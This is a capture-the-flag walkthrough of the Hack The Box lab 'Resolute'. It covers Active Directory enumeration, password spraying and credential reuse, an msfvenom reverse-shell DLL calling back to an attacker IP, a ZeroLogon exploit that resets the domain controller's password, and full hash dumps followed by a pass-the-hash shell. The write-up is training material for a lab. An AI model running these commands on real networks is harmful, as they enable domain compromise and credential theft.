# Resolute (Medium)

RPC Null Authentication -> User Enumeratino -> marko:Welcome123! -> Password Spraying -> melanie:Welcome123! -> WinRM ->&#x20;

## Information Gathering

Scanned all TCP ports:

```
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-10-01 00:47:35Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
```

Enumerated UDP ports:

```
PORT    STATE SERVICE VERSION
53/udp  open  domain  (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   NBTStat: 
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
123/udp open  ntp     NTP v3
389/udp open  ldap    Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Notes:

* 53/DNS - Domain <mark style="color:yellow;">megabank.local</mark> add to /etc/hosts
* 88/Kerberos - Exposed, so if we get any users, we should attempt AS-REP, Kerb if we have passwords, etc
  * AS-REP Failed
* 47001/HTTP - Some type of web server
  * Dirsearch did not detect anything
* 5985/WinRM - Valid creds gets us access
* 135/RPC - Can we authenticate using null? Yes Enumerate users and groups
  * Ended up finding password in a description

## Enumeration

### Port 88 - Kerberos

Enum4Linux:

```
enum4linux -a 10.129.60.74

Users:

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]

Groups: 

group:[Account Operators] rid:[0x224]                                                                                                              
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]
```

* I placed the following users into a users file and ran kerbrute userenum against it

```
./kerbrute_linux_amd64 userenum -d megabank.local users --dc 10.129.60.74                     55.1s  Sat 01 Oct 2022 10:42:24 AM EDT

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/01/22 - Ronnie Flathers @ropnop

2022/10/01 10:44:46 >  Using KDC(s):
2022/10/01 10:44:46 >   10.129.60.74:88

2022/10/01 10:44:46 >  [+] VALID USERNAME:       Administrator@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       ryan@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       marcus@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       marko@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       abigail@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       sunita@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       sally@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       angela@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       felicia@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       fred@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       gustavo@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       stevie@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       paulo@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       ulf@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       steve@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       claire@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       annette@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       claude@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       per@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       annika@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       zach@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       simon@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       naoki@megabank.local
2022/10/01 10:44:47 >  Done! Tested 24 usernames (23 valid) in 0.389 seconds
```

* We can see that they are all valid
* Attempt <mark style="color:yellow;">AS-REP Roasting</mark> -- <mark style="color:red;">failed</mark>
* SMB - No anonymous or Guest
* <mark style="color:yellow;">RPC</mark> - <mark style="color:yellow;">Null Authentication</mark> -- Interesting comment for user <mark style="color:yellow;">marco</mark>

```
rpcclient -U "" -N 10.129.60.74

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]

rpcclient $> querydispinfo
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       
Desc: Account created. Password set to Welcome123!
```

* <mark style="color:yellow;">marco:Welcome123!</mark>
* Attempted SMB authentication with new creds with no luck
* Okay, we have a password, let's password spray with the users that we enumerated earlier

### &#x20;  melanie:Welcome123!

* We have valid SMB credentials for <mark style="color:yellow;">melanie:Welcome123!</mark>

## Exploitation

### Password Spraying SMB

CrackMapExec

```
crackmapexec smb 10.129.60.74 -u users -p 'Welcome123!'

SMB         10.129.60.74    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

* We have valid SMB credentials for <mark style="color:yellow;">melanie:Welcome123!</mark>

### Enum4Linux (Authenticated)

```
enum4linux -a -u "melanie" -p "Welcome123!" 10.129.60.74
```

* Let's upload adPEAS and see what we can see

## Privilege Escalation

melanie -> ryan

### Local enumeration

### Bypass AMSI

```
Bypass-4MSI
```

### adPEAS usage

```
Import-Module .\adPEAS.ps1
Invoke-ADPeas
```

* Unfortunately, there was nothing useful

### WinPEAS Usage

* I could also not find anything of use
* I believe we need to conduct manual enumeration as there could be something lurking in the file system that we missed with automated enumeration tools

### PowerShell Transcript

* Had to conduct manual enumeration&#x20;
* <mark style="color:yellow;">C:\PSTranscripts\20191203\PowerShell\_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</mark>

{% code overflow="wrap" %}
```
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```
{% endcode %}

* We see here in PS history that ryan is using his password to access a drive

<mark style="color:yellow;">ryan:Serv3r4Admin4cc123!</mark>

Access via Evil-WinRM:

<figure><img src="../../../.gitbook/assets/image (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

* We see that ryan has a note on his Desktop:

{% code overflow="wrap" %}
```
type note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```
{% endcode %}

ryan -> admin

Enumeration:

{% code overflow="wrap" %}
```
whoami /groups

MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
```
{% endcode %}

* I have not ever seen the <mark style="color:yellow;">DnsAdmins</mark> group before so I do some research on it

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise" %}

### Exploiting DnsAdmin Privileges

* The first thing we need to do is craft a malicious DLL which will grant us arbitrary code-execution in the context of SYSTEM

msfvenom:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=443 -f dll > evil.dll
```

## Unintended Pathway (Easy Mode) -- Zero Logon

Github PoC:

{% embed url="https://github.com/risksense/zerologon.git" %}

1. Obtain NetBIOS name with nmap scan (Resolute)
2. Clone Repo -- Run sudo pip install -r requirements.txt if it does not work
3. chmod +x set empty pw&#x20;
4. Run Zero Logon PoC:

{% code overflow="wrap" %}
```
python3 set_empty_pw.py Resolute 10.129.60.74

Performing authentication attempts...
==========================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
NetrServerAuthenticate3Response 
ServerCredential:               
    Data:                            b'#S;8\xc9WG\xfa' 
NegotiateFlags:                  556793855 
AccountRid:                      1000 
ErrorCode:                       0 


server challenge b'#]\xb4\x0e\xce\x87\x90\xcc'
NetrServerPasswordSet2Response 
ReturnAuthenticator:            
    Credential:                     
        Data:                            b'\x01\x9d\xf7\x00\xa7\xb6Ht' 
    Timestamp:                       0 
ErrorCode:                       0 



Success! DC should now have the empty string as its machine password.
```
{% endcode %}

* The DC should now have a null password

&#x20;   5\. Utilize impacket-secretsdump to dump domain credentials and wmiexec into the machine as Administrator:

```
impacket-secretsdump -just-dc megabank.local/Resolute\$@10.129.60.74

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fb3b106896cdaa8a08072775fbd9afe9:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:49a9276d51927d3cd34a8ac69ae39c40:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
megabank.local\ryan:1105:aad3b435b51404eeaad3b435b51404ee:3f653cb103e005246bc95ceb2f56e30b:::
megabank.local\marko:1111:aad3b435b51404eeaad3b435b51404ee:8276510304cefe6e77c3a9e910ba3a6a:::
megabank.local\sunita:6601:aad3b435b51404eeaad3b435b51404ee:4e67de165ebd5e604d6580b15cfc61b2:::
megabank.local\abigail:6602:aad3b435b51404eeaad3b435b51404ee:3f67ccb851b02ac4ee9f91eeddf1cac7:::
megabank.local\marcus:6603:aad3b435b51404eeaad3b435b51404ee:d546df40747f48ece7e2be7349ec8f1b:::
megabank.local\sally:6604:aad3b435b51404eeaad3b435b51404ee:9d5a37664c09e08e8be59ca3e76c262f:::
megabank.local\fred:6605:aad3b435b51404eeaad3b435b51404ee:7be0fca1b4aec94356b86e4b1de06c4f:::
megabank.local\angela:6606:aad3b435b51404eeaad3b435b51404ee:07fe48603fa7ada83e62d14e54f45127:::
megabank.local\felicia:6607:aad3b435b51404eeaad3b435b51404ee:74dce6edc0eabd905d42e0a7225b80f3:::
megabank.local\gustavo:6608:aad3b435b51404eeaad3b435b51404ee:0b03061f9b79bf6642fe92aee0a109c6:::
megabank.local\ulf:6609:aad3b435b51404eeaad3b435b51404ee:f3dfd5c45de7a953c82fbe99749057c2:::
megabank.local\stevie:6610:aad3b435b51404eeaad3b435b51404ee:eb41b7464f302e573aaa697d191b5569:::
megabank.local\claire:6611:aad3b435b51404eeaad3b435b51404ee:72dc9d1d791307cf5217c8e39a88f56a:::
megabank.local\paulo:6612:aad3b435b51404eeaad3b435b51404ee:4e2d8cc79e15e601c099170a645483e6:::
megabank.local\steve:6613:aad3b435b51404eeaad3b435b51404ee:b8de802a1e7862c6e0e19be9c2baff0f:::
megabank.local\annette:6614:aad3b435b51404eeaad3b435b51404ee:2f9b8f25ec94dd46ecb071c27dc82905:::
megabank.local\annika:6615:aad3b435b51404eeaad3b435b51404ee:5d7226ebae151a224ada8add01bdc21c:::
megabank.local\per:6616:aad3b435b51404eeaad3b435b51404ee:b66616eb72209b81edded1fe63ae8806:::
megabank.local\claude:6617:aad3b435b51404eeaad3b435b51404ee:f059af81cb6022dc5de6389d4a6e6a65:::
megabank.local\melanie:10101:aad3b435b51404eeaad3b435b51404ee:e4a22d8e7bbec871b341c88c2e94cba2:::
megabank.local\zach:10102:aad3b435b51404eeaad3b435b51404ee:434927d08ddb971a8b14e407a58f6e9e:::
megabank.local\simon:10103:aad3b435b51404eeaad3b435b51404ee:25bc108c637a551f8b000054ea8ddc6e:::
megabank.local\naoki:10104:aad3b435b51404eeaad3b435b51404ee:07a1070c03b1a26e53d265d27ecb1a38:::
RESOLUTE$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
MS02$:1104:aad3b435b51404eeaad3b435b51404ee:7b71dcfa93cf1f5d37d34497b632c890:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:2c729d2a189d5ffdf4792a66eee8e7d37a6e5c37b57a722c307791e7a466f741
Administrator:aes128-cts-hmac-sha1-96:e175930b43cf0835cf361c9cb8d964b1
Administrator:des-cbc-md5:235e4979aeba1073
krbtgt:aes256-cts-hmac-sha1-96:25c34e568e89ccbc1435fbcd4a1067cf23629530d97656923a216b0de82dd333
krbtgt:aes128-cts-hmac-sha1-96:1dff59da1cf4b1c0fadd113dd2400d0b
krbtgt:des-cbc-md5:adcb106701349864
megabank.local\ryan:aes256-cts-hmac-sha1-96:1d5b6f6aaa4841a9b6fc727c114eafaf0b5cae266f2e47a81095cdce2ecc9f7c
megabank.local\ryan:aes128-cts-hmac-sha1-96:67e6a3eec4210a7c0341b72963da4f12
megabank.local\ryan:des-cbc-md5:62c279a8c1c10bd5
megabank.local\marko:aes256-cts-hmac-sha1-96:6ba81690c81b99f828a7d250e432722a95642c63ea201e8a6ba36db50116f6b2
megabank.local\marko:aes128-cts-hmac-sha1-96:7fa0f0b4a72a1ee50c5340ff5f2e7359
megabank.local\marko:des-cbc-md5:46b083b08a79e973
megabank.local\sunita:aes256-cts-hmac-sha1-96:1c31eaa2f2683cce009513f34b58ffcb880910ba9ae2a493a7850e3e1f55208b
megabank.local\sunita:aes128-cts-hmac-sha1-96:b055a012e88ad88a1478e913054d472c
megabank.local\sunita:des-cbc-md5:898ae62a8989832a
megabank.local\abigail:aes256-cts-hmac-sha1-96:a8473d8954d7f3b017561af651e3683eceb8adab27dad0d97a64fe9889c6c600
megabank.local\abigail:aes128-cts-hmac-sha1-96:c1882b7df861cc12bcf86b490793b8e1
megabank.local\abigail:des-cbc-md5:f4388a54e080d610
megabank.local\marcus:aes256-cts-hmac-sha1-96:ed97b881856e9f256976c4317270df2b0c383137f4a2d9289a30a0c8ac9568f0
megabank.local\marcus:aes128-cts-hmac-sha1-96:91e53044de3baa093817db78e7bfc957
megabank.local\marcus:des-cbc-md5:078c4adf98cbb943
megabank.local\sally:aes256-cts-hmac-sha1-96:f3f57f7f0f5ae1de03e946f01f641565a1744deb115e20095e1a48af7341c548
megabank.local\sally:aes128-cts-hmac-sha1-96:3db0cdd0bfa2b9388bfb98885affe537
megabank.local\sally:des-cbc-md5:c4c1f4e9ab98574f
megabank.local\fred:aes256-cts-hmac-sha1-96:f6125e4c00cf1c1c9f93b5f03578eef8edde13f858012caaf500a5f57ea4b1b8
megabank.local\fred:aes128-cts-hmac-sha1-96:6432e8085f207ad837038c6bd30d95b9
megabank.local\fred:des-cbc-md5:31310e1f8c68e907
megabank.local\angela:aes256-cts-hmac-sha1-96:fd77e01c6a2ad42d79d1ab13a8991ec4987d06c5087022983dcee3e288a4319d
megabank.local\angela:aes128-cts-hmac-sha1-96:e8a5bf3aef414ee84b69d0729d8bf055
megabank.local\angela:des-cbc-md5:01f889578c32cb91
megabank.local\felicia:aes256-cts-hmac-sha1-96:d6155ece9141d52abdd40504552296306af3b108034da7170737a2cf5fb6bcb8
megabank.local\felicia:aes128-cts-hmac-sha1-96:20baa9a112699e5d2751af868ab9aefc
megabank.local\felicia:des-cbc-md5:b331a80b3876c470
megabank.local\gustavo:aes256-cts-hmac-sha1-96:4d00b13243910022a07275bd88cd5b6dfca49f82f6b0200b7f990f527bdb482b
megabank.local\gustavo:aes128-cts-hmac-sha1-96:f454326d38c881899f246fa2e711d59f
megabank.local\gustavo:des-cbc-md5:291f1c2a754943ad
megabank.local\ulf:aes256-cts-hmac-sha1-96:e4663bb3849429da167fb460e9c3d15da93c1ce50d24641411500c4bf1b3962c
megabank.local\ulf:aes128-cts-hmac-sha1-96:ebdbf19e8b51bedec2de1babc1154e6f
megabank.local\ulf:des-cbc-md5:fe2ff1da6b6d73fb
megabank.local\stevie:aes256-cts-hmac-sha1-96:f308737f7c792ac1b74f3f6855cad1860b478c8afd906df1b4b14b21d858c5b7
megabank.local\stevie:aes128-cts-hmac-sha1-96:0192b45aa6e143b340b409a377c084f0
megabank.local\stevie:des-cbc-md5:e623166449498c85
megabank.local\claire:aes256-cts-hmac-sha1-96:3a8882538cd36730a38637b23c1ce296946b94a74410568343531dfb623153e2
megabank.local\claire:aes128-cts-hmac-sha1-96:782388d0700da184fe5d978551ae9078
megabank.local\claire:des-cbc-md5:296d944998b63138
megabank.local\paulo:aes256-cts-hmac-sha1-96:0407f0c1a2d50ac27a7f60dff7165aee3ce80f3789b4d1b1bfc3568e477371e2
megabank.local\paulo:aes128-cts-hmac-sha1-96:db3794331a5cac201f9cde86fe959eef
megabank.local\paulo:des-cbc-md5:52b97f7c94808cb3
megabank.local\steve:aes256-cts-hmac-sha1-96:c1eb8da00fe9a4df1e0e85f6eec06a00afa11a19a26116aca04360bf030d379e
megabank.local\steve:aes128-cts-hmac-sha1-96:f6c379343ad9cf7ad17ae5dc339bef87
megabank.local\steve:des-cbc-md5:dcb09780e59dd36b
megabank.local\annette:aes256-cts-hmac-sha1-96:3ef07851ad3a81a2ae88587f6b1268c080d59d3e41e07bd54e97d88d9a1c7541
megabank.local\annette:aes128-cts-hmac-sha1-96:2e238dc190585c1fe68b553f9dfc7738
megabank.local\annette:des-cbc-md5:2a688045d9a868cd
megabank.local\annika:aes256-cts-hmac-sha1-96:43a85bf8df3087cd197cddeb9916887b6cfbedca675f00c3991abb344e894256
megabank.local\annika:aes128-cts-hmac-sha1-96:9bfcad30e8fe505431432b65260f0722
megabank.local\annika:des-cbc-md5:ef468ce946eaf1e5
megabank.local\per:aes256-cts-hmac-sha1-96:7b338c02de23b91a7186fb8eef8a854b17df81cf261ef11a7c2ab6150eb7de52
megabank.local\per:aes128-cts-hmac-sha1-96:bb36d55a17fbb55def6f27a0f6d9f121
megabank.local\per:des-cbc-md5:8919b902678a4f2a
megabank.local\claude:aes256-cts-hmac-sha1-96:99dd9da983f3f1c645d1e4db5097428d6e98a5858a0dc26986a6b16771f81c74
megabank.local\claude:aes128-cts-hmac-sha1-96:bcb9376a3bcb7356700423970f187291
megabank.local\claude:des-cbc-md5:f2dcfe13ea290297
megabank.local\melanie:aes256-cts-hmac-sha1-96:d99fed082814833e7a128f4f82e425ad7e0ef9e30356fe944c1d7391954240dc
megabank.local\melanie:aes128-cts-hmac-sha1-96:7c08d66da82cff1b52ce762bf4bee3bb
megabank.local\melanie:des-cbc-md5:fdb99de3a704fe32
megabank.local\zach:aes256-cts-hmac-sha1-96:4295505ced2fa3a04a0c57ba8824756cb7344c050a23cb1dfe0c96e479c4dda7
megabank.local\zach:aes128-cts-hmac-sha1-96:32fb18cc45a6f6d250f1998e1edf9b91
megabank.local\zach:des-cbc-md5:735b1c37fb68e0a1
megabank.local\simon:aes256-cts-hmac-sha1-96:22c8f32ed5a42a8d09d8a033aaf17d9b6e94454a274e084d1d26c304b8e67260
megabank.local\simon:aes128-cts-hmac-sha1-96:b3936c2e62cb02642c634cf7433e13ed
megabank.local\simon:des-cbc-md5:4c5ef42370026d86
megabank.local\naoki:aes256-cts-hmac-sha1-96:2a3bc7723b6f0190a8d4b101488e2307ca844496a0f086ca9e3667fad5cb23a1
megabank.local\naoki:aes128-cts-hmac-sha1-96:6873a96fdb162feb50a0372333f71ba8
megabank.local\naoki:des-cbc-md5:3292262c7592ea16
RESOLUTE$:aes256-cts-hmac-sha1-96:21945ed8d17ca1968a22564f45a453245b3348baf6d0696cea31d6ccec4bab7b
RESOLUTE$:aes128-cts-hmac-sha1-96:840edc4017d3f2bcfe854976c9ad2026
RESOLUTE$:des-cbc-md5:bc0804e35b3dbf64
MS02$:aes256-cts-hmac-sha1-96:09481277b7203cba30eb72cdfd03384cab3ec47c76b4c9cdd90fd9fd30d09c6b
MS02$:aes128-cts-hmac-sha1-96:dbbad923e27b1099854233b8bfb890ee
MS02$:des-cbc-md5:e6806b490d0b83b3
[*] Cleaning up...
```

&#x20;    6\. WMIEXEC

```
impacket-wmiexec megabank.local/Administrator@10.129.60.74 -hashes aad3b435b51404eeaad3b435b51404ee:fb3b106896cdaa8a08072775fbd9afe9

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
megabank\administrator
```

## Proofs
